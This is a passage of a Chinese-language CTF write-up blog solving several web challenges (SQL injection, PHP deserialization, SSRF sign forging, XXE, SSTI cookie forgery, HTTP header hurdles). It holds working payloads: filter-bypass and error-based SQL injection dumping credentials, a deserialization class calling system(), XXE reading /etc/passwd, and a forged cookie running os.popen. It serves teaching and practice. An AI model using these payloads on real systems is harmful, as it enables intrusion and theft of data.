+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39; ununionion seselectlect 1,group_concat(table_name),3  frfromom infoorrmation_schema.tables whwhereere table_schema&#x3D;database() %23 #爆表名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(column_name),3  frfromom infoorrmation_schema.columns whwhereere table_schema&#x3D;database() aandnd table_name&#x3D;&#39;b4bsql&#39; %23 #爆列名</span><br><span class="line">-1&#39; ununionion seselectlect 1,group_concat(concat_ws(0x7e,username,passwoorrd)),3  frfromom b4bsql %23 #爆数据</span><br></pre></td></tr></table></figure>
+<p>拿到flag</p>
+<blockquote>
+<p>flag{cbf6aeea-a401-4c47-b000-c373eaef6289}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>这题进来之后发现只有一个payflag页面可以进</p>
+<p>进入之后ctrl+U在下面发现了一串代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>可以得知咱要以POST方式发送一个不是数字并且要等于404的password变量和money变量</p>
+<p>发现burpsuite重发之后会出现一句<strong>Only Cuit’s students can buy the FLAG</strong></p>
+<p>这里咱重新查看下抓的包，发现了一个user参数，令user=1</p>
+<p>发送出去之后前两个都正确了，但是还是出现了一句<strong>Nember lenth is too long</strong></p>
+<p>那只能是money参数出现了问题，将money=100000000改为money=1e9即可得到flag</p>
+<p><img src="https://i.loli.net/2021/03/14/LSq3PIr8Q2TlzcO.png"></p>
+<blockquote>
+<p>flag{68ff87f9-0c7f-4c49-b057-2af8e9ea3ed3}</p>
+</blockquote>
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>这题sql注入惯例试了下<strong>1’ or 1=1 %23</strong></p>
+<p>结果很友善的回了一句臭弟弟</p>
+<p>之后试了一下其他的发现把空格等一些字符还有union给ban了，于是就想到了报错注入</p>
+<p><strong>1’or(updatexml(1,concat_ws((select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆表名</strong><br><strong>1’or(updatexml(1,concat_ws((select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e,0x7e),1))%23 #爆列名</strong><br><strong>1’or(updatexml(1,concat_ws((select(concat_ws(0x7e,username,password))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆数据</strong>（结果发现只有一半，后面查到了一个right()</p>
+<p><strong>1’or(updatexml(1,concat_ws((select(right(group_concat(password),20))from(H4rDsq1)),0x7e,0x7e),1))%23 #爆后边的flag</strong>（这里要注意flag的连接，不是对半开的</p>
+<p>这里是flag</p>
+<blockquote>
+<p>flag{16f2507c-b985-4744-9b3b-8f02007f0c29}</p>
+</blockquote>
+<h2 id="安洵杯easy-web"><a href="#安洵杯easy-web" class="headerlink" title="安洵杯easy_web"></a>安洵杯easy_web</h2><h3 id="md5碰撞绕过"><a href="#md5碰撞绕过" class="headerlink" title="md5碰撞绕过"></a>md5碰撞绕过</h3><p>学习到了可以通过md5碰撞绕过md5</p>
+<p>但是找到的那个.exe程序运行了没反应，所以先把参数记下来后面用到可以直接拿来先用着</p>
+<h2 id="网鼎杯phpweb"><a href="#网鼎杯phpweb" class="headerlink" title="网鼎杯phpweb"></a>网鼎杯phpweb</h2><p><img src="https://i.loli.net/2021/04/16/XPuztLepqZaQYWU.png"></p>
+<h3 id="file-get-contents-得到源码"><a href="#file-get-contents-得到源码" class="headerlink" title="file_get_contents()得到源码"></a>file_get_contents()得到源码</h3><p>抓包后发现可以输入点，可以看出是放个函数和函数的参数</p>
+<p>于是我们可以利用<code>file_get_contents()</code>函数来得到index.php的源代码</p>
+<blockquote>
+<p>func=file_get_contents()&amp;p=index.php</p>
+</blockquote>
+<p>拿到index.php源代码之后可以发现func那里拦截了许多函数，但是有一个有一个Test类可以进行利用</p>
+<h3 id="反序列化RCE"><a href="#反序列化RCE" class="headerlink" title="反序列化RCE"></a>反序列化RCE</h3><p>构造反序列化代码进行RCE</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>tips：flag并不在根目录下，所以还需要<code>find / -name flag</code>来查找flag</p>
+<p>最终得到flag</p>
+<blockquote>
+<p>   flag{d1569b58-26c5-4528-95fa-150f11cab19e}</p>
+</blockquote>
+<h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><h3 id="flask框架分析"><a href="#flask框架分析" class="headerlink" title="flask框架分析"></a>flask框架分析</h3><p>打开题目拿到一串很长很长的代码</p>
+<p>优化一下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(self.sandbox):</span><br><span class="line">            <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(resp)</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> getSign(self.action, self.param) == self.sign:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+<p>先看路由，有一个/geneSign和一个/De1ta</p>
+<p>看看/geneSign</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure>
+<p>get方法传入一个param，然后到getSign函数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>
+<p>md5编码一个随机数值+param+action</p>
+<p>再看看/De1ta</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span> waf(param):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure>
+<p>通过GET方法传入param，通过cookie传入action和sign</p>
+<p>再往下会遇到一个if，然后进入waf函数</p>
+<p>看看waf函数</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check = param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+<p>如果参数头是<code>gopher</code>或<code>file</code>就会被防住</p>
+<h3 id="sign-payload构造"><a href="#sign-payload构造" class="headerlink" title="sign payload构造"></a>sign payload构造</h3><p>最后会构造一个Task类</p>
+<p>Task类里首先会遇到一个checkSign方法</p>
+<p>会判断<code>getSign(self.action, self.param) == self.sign</code></p>
+<p>这里的意思就是我们要构造一个getSign使得<code>md5(param+action)</code>==<code>md5(param+&#39;scan&#39;(不可控))</code>，这里我们可以利用/geneSign路由进行自主构造sign参数</p>
+<p>param=flag.txtread，因为Task类里的if判断是包含，所以我们可以在后面加一个read绕过判断</p>
+<p>最后可以得到sign的payload</p>
+<blockquote>
+<p>param=flag.txtread</p>
+</blockquote>
+<h3 id="action-payload构造"><a href="#action-payload构造" class="headerlink" title="action payload构造"></a>action payload构造</h3><p>最后就是</p>
+<p>构造一个action的payload进行flag.txt的读取，action又需要同时进入两个if</p>
+<p>所以我们可以这样整</p>
+<p>param=flag.txt</p>
+<p>action=readscan</p>
+<p>sign=94f5d01e5071cf13ee12db1b5b76c89f(sign就拿之前在/geneSign路由上得到的</p>
+<p>最后得到flag</p>
+<blockquote>
+<p>flag{4d8642e8-b33b-439d-8219-651342e482b5}</p>
+</blockquote>
+<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><h3 id="XML实体注入"><a href="#XML实体注入" class="headerlink" title="XML实体注入"></a>XML实体注入</h3><p>抓包后发现username和password都是xml格式的，所以我们可以选择XML注入</p>
+<p>读取/etc/passwd文件</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>读取flag</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">admin</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>1<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最终得到flag</p>
+<blockquote>
+<p>flag{b831032d-7b48-4d76-bb55-01a9a629def6}</p>
+</blockquote>
+<h3 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h3><p>顺便了解了一下XML和什么是XXE注入</p>
+<p>XXE看字</p>
+<blockquote>
+<p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</p>
+</blockquote>
+<p>XML可以看看这篇文章<a href="https://www.freebuf.com/vuls/175451.html">浅谈XML实体注入漏洞</a></p>
+<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>进入后可以输入队伍ID和价钱，1、2、3都试了一遍然后都出错了，猜测Team4购买成功后就可以拿到flag了</p>
+<p>试试team4，然后提示<code>Only one char(?) allowed!</code>，只允许输入一个字符</p>
+<h3 id="UTF-8特殊字符代替"><a href="#UTF-8特殊字符代替" class="headerlink" title="UTF-8特殊字符代替"></a>UTF-8特殊字符代替</h3><p>看了看源码发现提示</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="comment">&lt;!--Ah,really important,seriously. --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>了解了一下UTF-8编码，发现UTF-8编码其实有特别多特别多的字符</p>
+<p>这里可以去<a href="https://www.compart.com/en/unicode/">这个网站</a>，这个网站拥有许多UTF-8字符</p>
+<p>查找thousand，最后发现了一个字符ↁ，这个字符的Numeric Value为5000，正好符合我们的要求</p>
+<p>最后即可得到flag</p>
+<blockquote>
+<p>flag{76457339-63ab-4556-b52e-5a2f6d054406}</p>
+</blockquote>
+<h2 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h2><h3 id="SSTI获取screat-key"><a href="#SSTI获取screat-key" class="headerlink" title="SSTI获取screat_key"></a>SSTI获取screat_key</h3><p>题目是一个简易计算器，测试<code>1/0</code>发现出现错误，猜测是模板注入，输入<code>1/0#&#123;&#123;config&#125;&#125;</code>，发现了screat_key</p>
+<h3 id="cookie伪造"><a href="#cookie伪造" class="headerlink" title="cookie伪造"></a>cookie伪造</h3><p>用<code>flask-session-cookie-manager</code>解出cookie的结构，使用上面获取的key进行cookie伪造</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&#123;&#x27;history&#x27;:[&#123;&#x27;code&#x27;:&#x27;__import__[\&quot;os\&quot;].popen(\&quot;cat flag.txt\&quot;).read()&#x27;&#125;]&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+<p>最后得到flag</p>
+<blockquote>
+<p>flag{3990ba1e-8331-4dd6-8bae-77ac90a09c81}</p>
+</blockquote>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这题对现在的我来说是一道比较新鲜的题，知道了还有cookie伪造的这个姿势，重新了解了一下cookie的含义</p>
+<h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p>进入题目看见一句<code>You&#39;ll be rewarded with a flag if you can make it over some /hurdles.</code></p>
+<h3 id="curl的命令使用"><a href="#curl的命令使用" class="headerlink" title="curl的命令使用"></a>curl的命令使用</h3><p>通过curl查看</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I was expecting the PUT Method.</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, Your path would be more exciting if it ended in !</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, Your URL did not ask to </code>get<code>the</code>flag<code> in its query string.</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I was looking for a parameter named &amp;=&amp;=&amp;</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
+<p>得到</p>
+<p><code>I&#39;m sorry, I expected &#39;&amp;=&amp;=&amp;&#39; to equal &#39;%00 #这有个换行符的 &#39;</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, Basically, I was expecting the username player.</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:player&#39; # 暂时不知道密码，随便输一个</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, Basically, I was expecting the password of the hex representation of the md5 of the string &#39;open sesame&#39;</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I was expecting you to be using a 1337 Browser.</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I was expecting your browser version (v.XXXX) to be over 9000!</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I was eXpecting this to be Forwarded-For someone!</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 127.0.0.1&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I was eXpecting this to be Forwarded For someone through another proxy!</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 1.1.1.1,127.0.0.1&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I was expecting the forwarding client to be 13.37.13.37</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i -X PUT &#39;http:&#x2F;&#x2F;node3.buuoj.cn:27112&#x2F;hurdles&#x2F;!?get&#x3D;flag&amp;%26%3D%26%3D%26&#x3D;%2500%0A&#39; -u &#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39; -A &#39;1337 Brower v.9000&#39; -H &#39;X-Forwarded-For: 13.37.13.37,127.0.0.1&#39;</span><br></pre></td></tr></table></figure>
+<p>得到<code>I&#39;m sorry, I was expecting a Fortune Cookie</code></p>
